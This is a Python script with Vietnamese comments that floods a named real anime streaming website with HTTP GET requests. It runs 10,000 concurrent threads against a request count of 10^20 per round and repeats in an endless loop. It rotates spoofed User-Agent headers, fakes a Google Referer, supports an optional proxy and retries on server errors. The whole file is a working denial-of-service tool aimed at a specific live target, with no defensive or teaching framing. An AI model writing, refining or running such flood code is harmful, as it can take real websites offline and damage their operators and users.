import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from fake_useragent import UserAgent
from colorama import Fore, init

# Khởi tạo colorama để sử dụng màu sắc trong terminal
init(autoreset=True)

# Giá trị mặc định cố định
URL = "https://animehay.loan/"  # Thay đổi URL nếu cần
TOTAL_REQUESTS = 100000000000000000000     # Tổng số request mỗi đợt
CONCURRENCY = 10000        # Số lượng thread chạy đồng thời
PROXY_URL = None             # Đặt proxy nếu cần, ví dụ: "http://proxy:port"

# Danh sách User-Agent cố định
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
]

# Khởi tạo User-Agent tự động
ua = UserAgent()

# Biến toàn cục để theo dõi trạng thái
success_requests = 0
failed_requests = 0

def get_headers():
    """Tạo header với User-Agent ngẫu nhiên hoặc cố định"""
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "http://www.google.com/",
        "Connection": "keep-alive"
    }
    return headers

def get_session():
    """Tạo session với retry logic để xử lý lỗi"""
    session = requests.Session()
    retry = Retry(
        total=5,  # Số lần thử lại
        backoff_factor=1,  # Độ trễ tăng dần giữa các lần thử
        status_forcelist=[500, 502, 503, 504]  # Các mã lỗi cần thử lại
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def make_request(session):
    """Thực hiện một request tới URL"""
    global success_requests, failed_requests
    try:
        headers = get_headers()
        proxy = {"http": PROXY_URL, "https": PROXY_URL} if PROXY_URL else None
        response = session.get(URL, timeout=3, headers=headers, proxies=proxy)
        if response.status_code == 200:
            success_requests += 1
            print(Fore.GREEN + f"Request thành công: {response.status_code}")
        else:
            print(Fore.YELLOW + f"Request thất bại với mã: {response.status_code}")
            failed_requests += 1
    except Exception as e:
        print(Fore.RED + f"Lỗi: {e}")
        failed_requests += 1

def send_requests():
    """Gửi tất cả request song song bằng ThreadPoolExecutor"""
    session = get_session()
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as executor:
        futures = [executor.submit(make_request, session) for _ in range(TOTAL_REQUESTS)]
        for future in futures:
            future.result()

def print_progress():
    """Hiển thị tiến độ gửi request"""
    print(Fore.CYAN + f"Tổng số request đã gửi: {TOTAL_REQUESTS}")
    print(Fore.GREEN + f"Thành công: {success_requests}")
    print(Fore.RED + f"Thất bại: {failed_requests}")

# Chạy chương trình trong vòng lặp vô hạn
while True:
    print(Fore.MAGENTA + "\nBắt đầu gửi requests...")
    send_requests()
    print_progress()
    time.sleep(1)  # Nghỉ 1 giây trước khi chạy đợt tiếp theo